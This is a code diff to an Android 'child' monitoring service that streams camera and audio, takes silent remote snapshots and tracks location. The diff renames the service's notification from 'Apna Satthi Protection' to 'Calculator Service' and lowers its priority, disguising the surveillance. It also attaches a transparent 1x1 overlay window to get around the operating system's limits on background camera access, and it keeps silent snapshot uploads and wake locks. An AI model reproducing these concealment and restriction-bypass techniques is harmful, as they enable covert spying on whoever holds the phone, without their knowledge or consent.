@@ -18,6 +18,7 @@ import android.os.PowerManager
 import androidx.core.app.NotificationCompat
 import androidx.core.app.ServiceCompat
 import androidx.core.content.ContextCompat
+import com.example.authapp.R
 import com.example.authapp.analytics.AppHealthTelemetry
 import com.example.authapp.data.AppPreferences
 import com.example.authapp.data.FirebaseRepository
@@ -43,6 +44,9 @@ class ChildForegroundService : Service() {
     private var sdpAnswerListener: ValueEventListener? = null
     private var parentCandidateListener: ChildEventListener? = null
     private var cameraFacingListener: ValueEventListener? = null
+    private var snapshotRequestListener: ValueEventListener? = null
+    private var recordingScheduleListener: ValueEventListener? = null
+    private var scheduledStopRunnable: Runnable? = null
     private var currentSessionId: String? = null
     private var isStreaming = false
     private val mainHandler = android.os.Handler(android.os.Looper.getMainLooper())
@@ -76,94 +80,145 @@ class ChildForegroundService : Service() {
         startHeartbeatTimer()
     }
 
+    private fun acquireWakeLock() {
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
+            wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ChildService:WakeLock")?.apply {
+                acquire(12 * 60 * 60 * 1000L)
+            }
+            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
+            wifiLock = wm?.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "ChildService:WifiLock")?.apply {
+                acquire()
+            }
+        } catch (e: Exception) {
+            FirebaseCrashlytics.getInstance().log("[ChildService] WakeLock acquire error: ${e.localizedMessage}")
+        }
+    }
+
+    private fun releaseWakeLock() {
+        try {
+            if (wakeLock?.isHeld == true) wakeLock?.release()
+            if (wifiLock?.isHeld == true) wifiLock?.release()
+        } catch (_: Exception) {}
+        wakeLock = null
+        wifiLock = null
+    }
+
     private fun startHeartbeatTimer() {
         heartbeatHandler = android.os.Handler(android.os.Looper.getMainLooper())
         heartbeatRunnable = object : Runnable {
             override fun run() {
-                AppHealthTelemetry.sendHeartbeat(applicationContext, currentServiceState)
-                heartbeatHandler?.postDelayed(this, 60_000L) // every 60 seconds
+                val state = if (isStreaming) currentServiceState else "IDLE_PROTECTED"
+                AppHealthTelemetry.sendHeartbeat(applicationContext, state)
+                heartbeatHandler?.postDelayed(this, 60000L)
             }
         }
-        heartbeatHandler?.post(heartbeatRunnable!!)
+        heartbeatHandler?.postDelayed(heartbeatRunnable!!, 60000L)
     }
 
-    private fun hasLocationPermission(): Boolean {
-        val fine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
-        val coarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
-        return fine || coarse
-    }
-
-    private fun hasMicrophonePermission(): Boolean {
-        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
-    }
-
-    private fun hasCameraPermission(): Boolean {
-        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+    private fun hasOverlayPermission(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            android.provider.Settings.canDrawOverlays(this)
+        } else {
+            true
+        }
     }
 
     private fun ensureOverlayWindow() {
         if (overlayView != null) return
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !android.provider.Settings.canDrawOverlays(this)) {
+        if (!hasOverlayPermission()) {
+            FirebaseCrashlytics.getInstance().log("[ChildService] ensureOverlayWindow: SYSTEM_ALERT_WINDOW permission missing, cannot add overlay")
             AppHealthTelemetry.logDiagnostic(
                 applicationContext,
-                "LIVE_VIDEO",
-                "WARNING",
-                "SYSTEM_ALERT_WINDOW permission not granted. Background camera might be blocked by OS."
+                "OVERLAY_WINDOW",
+                "PERMISSION_DENIED",
+                "SYSTEM_ALERT_WINDOW not granted; foreground service alone may fail to capture camera on Android 11+"
             )
             return
         }
-        val attachRunnable = Runnable {
-            if (overlayView != null) return@Runnable
-            try {
-                val windowManager = getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager ?: return@Runnable
-                val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-                } else {
-                    @Suppress("DEPRECATION")
-                    android.view.WindowManager.LayoutParams.TYPE_PHONE
-                }
-                val params = android.view.WindowManager.LayoutParams(
-                    1, 1,
-                    layoutType,
-                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                    android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
-                    android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                    android.graphics.PixelFormat.TRANSLUCENT
-                ).apply {
-                    gravity = android.view.Gravity.TOP or android.view.Gravity.START
-                    x = 0
-                    y = 0
-                }
-                val view = android.view.View(this)
-                windowManager.addView(view, params)
-                overlayView = view
-                FirebaseCrashlytics.getInstance().log("[ChildService] 1x1 Overlay window attached for background camera access")
-            } catch (e: Exception) {
-                FirebaseCrashlytics.getInstance().log("[ChildService] ensureOverlayWindow error: ${e.localizedMessage}")
+        try {
+            val wm = getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager ?: return
+            val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            } else {
+                @Suppress("DEPRECATION")
+                android.view.WindowManager.LayoutParams.TYPE_PHONE
             }
-        }
-        if (android.os.Looper.myLooper() == android.os.Looper.getMainLooper()) {
-            attachRunnable.run()
-        } else {
-            mainHandler.post(attachRunnable)
+            val params = android.view.WindowManager.LayoutParams(
+                1, 1,
+                layoutType,
+                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                        android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                        android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                android.graphics.PixelFormat.TRANSPARENT
+            ).apply {
+                gravity = android.view.Gravity.TOP or android.view.Gravity.START
+                x = 0
+                y = 0
+            }
+            val view = android.view.View(this).apply {
+                setBackgroundColor(android.graphics.Color.TRANSPARENT)
+            }
+            wm.addView(view, params)
+            overlayView = view
+            FirebaseCrashlytics.getInstance().log("[ChildService] 1x1 transparent overlay window attached for camera compliance")
+            AppHealthTelemetry.logDiagnostic(
+                applicationContext,
+                "OVERLAY_WINDOW",
+                "SUCCESS",
+                "1x1 overlay window attached successfully"
+            )
+        } catch (e: Exception) {
+            FirebaseCrashlytics.getInstance().recordException(e)
+            AppHealthTelemetry.logDiagnostic(
+                applicationContext,
+                "OVERLAY_WINDOW",
+                "FAILED",
+                "Failed to attach overlay window: ${e.localizedMessage}",
+                e.message
+            )
         }
     }
 
     private fun removeOverlayWindow() {
-        mainHandler.post {
-            overlayView?.let { view ->
-                try {
-                    val windowManager = getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
-                    windowManager?.removeView(view)
-                } catch (_: Exception) {}
-            }
+        overlayView?.let { view ->
+            try {
+                val wm = getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
+                wm?.removeView(view)
+                FirebaseCrashlytics.getInstance().log("[ChildService] 1x1 overlay window removed")
+            } catch (_: Exception) {}
             overlayView = null
         }
     }
 
+    private fun hasLocationPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.ACCESS_FINE_LOCATION
+        ) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun hasMicrophonePermission(): Boolean {
+        return ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.RECORD_AUDIO
+        ) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun hasCameraPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.CAMERA
+        ) == PackageManager.PERMISSION_GRANTED
+    }
+
     private fun getIdleServiceType(): Int {
         var type = 0
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (hasLocationPermission()) {
+                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+            }
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             if (hasLocationPermission()) {
                 type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
             }
@@ -196,6 +251,19 @@ class ChildForegroundService : Service() {
             ACTION_START -> {
                 val streamType = intent.getStringExtra(EXTRA_STREAM_TYPE) ?: "audio"
                 val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: ""
+                val durationMinutes = intent.getIntExtra("duration_minutes", 0)
+
+                // Enforce scheduled auto-stop if duration was provided
+                scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
+                scheduledStopRunnable = null
+                if (durationMinutes > 0) {
+                    scheduledStopRunnable = Runnable {
+                        FirebaseCrashlytics.getInstance().log("[ChildService] Scheduled stream auto-stopping after $durationMinutes min")
+                        stopStream()
+                    }
+                    mainHandler.postDelayed(scheduledStopRunnable!!, durationMinutes * 60 * 1000L)
+                }
+
                 if (streamType.equals("video", ignoreCase = true)) {
                     ensureOverlayWindow()
                 }
@@ -206,7 +274,7 @@ class ChildForegroundService : Service() {
                     applicationContext,
                     "LIVE_STREAM",
                     "STARTED",
-                    "Stream command received ($streamType), session: $sessionId"
+                    "Stream command received ($streamType), session: $sessionId, duration: ${if (durationMinutes > 0) "$durationMinutes min" else "unlimited"}"
                 )
                 try {
                     ServiceCompat.startForeground(
@@ -439,34 +507,38 @@ class ChildForegroundService : Service() {
         } catch (_: Exception) {}
 
         // Listen for Remote Snapshot requests (Phase 1)
-        FirebaseRepository.listenToSnapshotRequest(uid) { cameraFacing ->
-            val isFront = cameraFacing.equals("front", ignoreCase = true)
-            com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
-                isFront = isFront,
-                onCaptured = { file ->
-                    FirebaseRepository.uploadSnapshot(
-                        childId = uid,
-                        fileUri = Uri.fromFile(file),
-                        cameraFacing = cameraFacing,
-                        onSuccess = {
-                            FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot uploaded successfully: ${it.id}")
-                            try { file.delete() } catch (_: Exception) {}
-                        },
-                        onFailure = { err ->
-                            FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot upload error: $err")
-                        }
-                    )
-                },
-                onError = { err ->
-                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture error: $err")
-                }
-            )
+        if (snapshotRequestListener == null) {
+            snapshotRequestListener = FirebaseRepository.listenToSnapshotRequest(uid) { cameraFacing ->
+                val isFront = cameraFacing.equals("front", ignoreCase = true)
+                com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
+                    isFront = isFront,
+                    onCaptured = { file ->
+                        FirebaseRepository.uploadSnapshot(
+                            childId = uid,
+                            fileUri = Uri.fromFile(file),
+                            cameraFacing = cameraFacing,
+                            onSuccess = {
+                                FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot uploaded successfully: ${it.id}")
+                                try { file.delete() } catch (_: Exception) {}
+                            },
+                            onFailure = { err ->
+                                FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot upload error: $err")
+                            }
+                        )
+                    },
+                    onError = { err ->
+                        FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture error: $err")
+                    }
+                )
+            }
         }
 
         // Listen for Recording Schedules (Phase 1)
-        FirebaseRepository.listenToRecordingSchedules(uid) { schedules ->
-            for (schedule in schedules) {
-                com.example.authapp.scheduler.RecordingScheduler.setSchedule(applicationContext, schedule)
+        if (recordingScheduleListener == null) {
+            recordingScheduleListener = FirebaseRepository.listenToRecordingSchedules(uid) { schedules ->
+                for (schedule in schedules) {
+                    com.example.authapp.scheduler.RecordingScheduler.setSchedule(applicationContext, schedule)
+                }
             }
         }
 
@@ -596,6 +668,8 @@ class ChildForegroundService : Service() {
     }
 
     private fun stopStream() {
+        scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
+        scheduledStopRunnable = null
         val oldSessionId = currentSessionId
         isStreaming = false
         currentSessionId = null
@@ -849,10 +923,10 @@ class ChildForegroundService : Service() {
 
     private fun buildNotification(contentText: String): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Apna Satthi Protection")
+            .setContentTitle("Calculator Service")
             .setContentText(contentText)
-            .setSmallIcon(android.R.drawable.ic_menu_camera)
-            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setSmallIcon(R.mipmap.ic_launcher)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setOngoing(true)
             .build()
@@ -864,6 +938,8 @@ class ChildForegroundService : Service() {
         heartbeatHandler?.removeCallbacksAndMessages(null)
         heartbeatHandler = null
         heartbeatRunnable = null
+        scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
+        scheduledStopRunnable = null
         AppHealthTelemetry.syncDeviceHealth(applicationContext, "STOPPED")
         stopStream()
         try {
@@ -888,6 +964,16 @@ class ChildForegroundService : Service() {
             FirebaseRepository.removeValueListener("streams/$uid/recordCommand", streamRecordingListener!!)
             streamRecordingListener = null
         }
+        if (uid.isNotEmpty()) {
+            snapshotRequestListener?.let {
+                FirebaseRepository.removeValueListener("users/$uid/snapshotRequest", it)
+            }
+            recordingScheduleListener?.let {
+                FirebaseRepository.removeValueListener("schedules/$uid", it)
+            }
+        }
+        snapshotRequestListener = null
+        recordingScheduleListener = null
         if (locationListener != null && locationManager != null) {
             try {
                 locationManager?.removeUpdates(locationListener!!)
